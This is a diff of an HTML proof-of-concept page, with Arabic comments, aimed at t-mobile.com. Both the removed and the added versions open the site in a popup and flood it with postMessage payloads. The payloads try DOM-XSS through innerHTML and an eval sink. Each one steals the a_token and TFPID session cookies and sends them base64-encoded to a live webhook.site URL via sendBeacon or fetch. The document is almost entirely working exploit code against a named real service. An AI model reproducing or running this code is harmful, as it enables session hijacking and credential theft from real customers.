@@ -1,65 +1,41 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>T-Mobile Exploit - Branch.io Sink</title>
+    <title>T-Mobile Exploit - Eval Sink</title>
 </head>
 <body style="background: #000; color: #e20074; text-align: center; padding-top: 50px; font-family: monospace;">
 
-    <h1>T-Mobile Security Research (PoC)</h1>
-    <div style="border: 2px solid #e20074; padding: 20px; display: inline-block;">
-        <p>المستهدف: DOM-XSS عبر Branch.io RenderQueue</p>
-        <button onclick="launch()" style="padding: 15px; background: #e20074; color: #fff; border: none; cursor: pointer; font-weight: bold;">تشغيل الهجوم</button>
-        <div id="status" style="margin-top: 20px; color: #00ff00;"></div>
-    </div>
+    <h1>Critical Vulnerability Found: Eval Sink</h1>
+    <button onclick="pwn()" style="padding: 20px; background: #e20074; color: white; border: none; cursor: pointer;">Execute Attack</button>
+    <div id="status" style="color: #00ff00; margin-top: 20px;"></div>
 
 <script>
-    const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
+    const webh = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
 
-    function log(msg) { document.getElementById('status').innerText = "> " + msg; }
-
-    function launch() {
-        log("فتح نافذة الضحية...");
+    function pwn() {
         const vic = window.open('https://www.t-mobile.com/', 'victim');
+        document.getElementById('status').innerText = "Target Opened. Triggering Ajax Sync...";
 
-        if (!vic) {
-            alert("يرجى السماح بالـ Pop-ups");
-            return;
-        }
-
-        // Payload مصمم لكسر سياق الـ Render في Branch.io
-        // بنجرب 3 أنواع من الحقن في رسالة واحدة
-        const payload = {
-            "type": "qm-sync", // النوع اللي اتعرف عليه Quantum Metric
+        // الـ Payload هنا بيحاول يكسر الـ JSON اللي راجع في الـ eval
+        // إحنا بنبعته في الـ action لأن الكود بيجمعه في السلسلة النصية
+        const exploitPayload = {
+            "type": "qm-sync", 
             "details": {
-                "account_number": "SCRUB_ME",
-                "cvv": "999",
-                // المحاولة 1: حقن HTML (لو الـ Sink هو innerHTML)
-                "html_payload": `<img src=x onerror="const k=['a_token','TFPID'];const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|');navigator.sendBeacon('${webhook}/?xss_html=' + btoa(d));">`,
-                
-                // المحاولة 2: كسر سلسلة نصية (لو الـ Sink هو eval أو JS Variable)
-                "toString": `');} catch(e){} const k=['a_token','TFPID']; const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|'); navigator.sendBeacon('${webhook}/?xss_js=' + btoa(d));//`
+                // محاولة حقن كود داخل الـ action اللي هيروح للـ AJAX
+                "action": "createNew'); const k=['a_token','TFPID']; const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|'); fetch('" + webh + "/?eval_pwn=' + btoa(d)); //",
+                "postParams": "v=1"
             }
         };
 
-        log("انتظار تحميل السكربتات (10 ثوانٍ)...");
-
-        let count = 0;
+        let attempts = 0;
         const interval = setInterval(() => {
-            count++;
-            log("إرسال النبضة رقم: " + count);
-
-            // إرسال كـ String لتخطي الـ Clone Error وضمان وصوله لـ JSON.parse
-            vic.postMessage(JSON.stringify(payload), "*");
+            attempts++;
+            // إرسال كـ String لضمان دخولها في الـ JSON.parse بتاعهم ومنه للـ Ajax function
+            vic.postMessage(JSON.stringify(exploitPayload), "*");
             
-            // إرسال كـ Object مباشر احتياطاً
-            vic.postMessage(payload, "*");
-
-            if (count >= 15) {
-                clearInterval(interval);
-                log("اكتمل الإرسال. افحص الـ Webhook.");
-            }
-        }, 4000);
+            if (attempts > 10) clearInterval(interval);
+        }, 3000);
     }
 </script>
 </body>
